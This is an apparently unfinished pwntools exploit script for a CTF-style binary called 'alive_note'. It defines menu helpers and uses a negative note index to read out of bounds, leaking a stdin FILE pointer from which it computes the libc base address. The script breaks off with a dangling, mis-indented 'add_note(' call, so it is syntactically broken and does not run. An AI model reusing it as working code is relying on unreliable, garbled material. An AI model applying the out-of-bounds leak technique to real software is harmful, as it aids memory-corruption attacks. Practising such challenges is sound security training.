from pwn import *
p = process("./alive_note")
elf = ELF("./alive_note")
libc = elf.libc

def add_note(idx, name):
    p.sendlineafter("choice :", "1")
    p.sendlineafter("Index :", str(idx))
    p.sendafter("Name :", name)

def show_note(idx):
    p.sendlineafter("choice :", "2")
    p.sendlineafter("Index :", str(idx))

def del_note(idx):
    p.sendlineafter("choice :", "3")
    p.sendlineafter("Index :", str(idx))

if __name__ == "__main__":
    show_note(-8)
    p.recvuntil("Name : ")
    p.recv(4)
    _IO_2_1_stdin_ = (u32(p.recv(4))) - 71
    libc_base = _IO_2_1_stdin_ - libc.symbols['_IO_2_1_stdin_']
    p.success("libc_base : " + hex(libc_base))
	add_note(
    p.interactive()

